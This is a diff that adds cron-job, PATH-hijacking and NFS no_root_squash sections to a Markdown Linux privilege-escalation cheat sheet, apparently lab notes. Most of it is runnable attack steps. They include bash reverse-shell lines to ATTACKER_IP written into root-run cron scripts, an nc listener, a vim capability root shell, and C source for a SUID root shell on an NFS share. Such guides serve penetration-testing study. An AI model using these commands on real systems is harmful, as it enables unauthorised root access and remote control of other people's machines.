@@ -118,4 +118,136 @@ Example: vim with cap_setuid+ep
 ```bash
 vim -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'
 ```
-This spawns a root shell if the binary is owned by root and has the right capability.
+This spawns a root shell if the binary is owned by root and has the right capabilit.
+
+---
+
+## 🧨 5. Privilege Escalation via Cron Jobs
+
+**Cron jobs** are scheduled tasks that run scripts or binaries at specific times. If a cron job runs as **root** and executes a script that is **writable by a low-privileged user**, it becomes a perfect escalation vector.
+
+### 🔍 Check for Cron Jobs
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron.*
+```
+Look for:
+
+Scripts running as root
+
+Writable scripts or missing scripts
+
+PATH misconfigurations
+
+🧪 Scenario 1: Writable Script
+If /etc/crontab contains:
+
+```Code
+* * * * * root /home/karen/backup.sh
+```
+And backup.sh is writable:
+
+```bash
+echo '#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /home/karen/backup.sh
+chmod +x /home/karen/backup.sh
+```
+Start a listener:
+
+```bash
+nc -lvnp PORT
+```
+Wait for the cron job to trigger and spawn a root shell.
+
+🧨 Scenario 2: Missing Script (PATH Hijack via Cron)
+If crontab contains:
+
+```Code
+* * * * * root antivirus.sh
+```
+And the script is missing, but no full path is specified:
+
+Check PATH in crontab:
+
+```bash
+cat /etc/crontab | grep PATH
+```
+Create a fake script in a writable PATH directory (e.g., /home/karen):
+
+```bash
+echo '#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /home/karen/antivirus.sh
+chmod +x /home/karen/antivirus.sh
+```
+Wait for the cron job to execute your script as root.
+
+🧱 6. Privilege Escalation via PATH Hijacking
+If a SUID binary or root-owned script calls another binary without a full path, and you can control the PATH, you can hijack the execution.
+
+🔍 Check PATH
+```bash
+echo $PATH
+```
+🔍 Find Writable Directories
+```bash
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+```
+If no writable directories are in PATH, prepend one:
+
+```bash
+export PATH=/tmp:$PATH
+```
+🧪 Create Fake Binary
+```bash
+cp /bin/bash /tmp/thm
+chmod +x /tmp/thm
+```
+If a SUID script calls thm, it will now execute /tmp/thm with root privileges.
+
+🌐 7. Privilege Escalation via NFS (no_root_squash)
+If the target system exports an NFS share with the no_root_squash option, and you can mount it, you can create a SUID binary that executes as root.
+
+🔍 Enumerate NFS Shares
+```bash
+showmount -e TARGET_IP
+```
+🔗 Mount the Share
+```bash
+mkdir /tmp/nfs
+sudo mount -o rw TARGET_IP:/shared/folder /tmp/nfs
+```
+🧱 Create SUID Binary
+```c
+// nfs.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+    return 0;
+}
+```
+```bash
+gcc nfs.c -o /tmp/nfs/rootme
+chmod +s /tmp/nfs/rootme
+```
+🚀 Execute on Target
+```bash
+/shared/folder/rootme
+```
+You now have a root shell.
+
+📚 References
+GTFOBins (Official)
+
+GTFOBins (Mirror)
+
+TryHackMe – Privilege Escalation Rooms
+
+Linux Capabilities – man page (man7.org in Bing)
+
+Stay sharp, stay ethical, and document everything.  
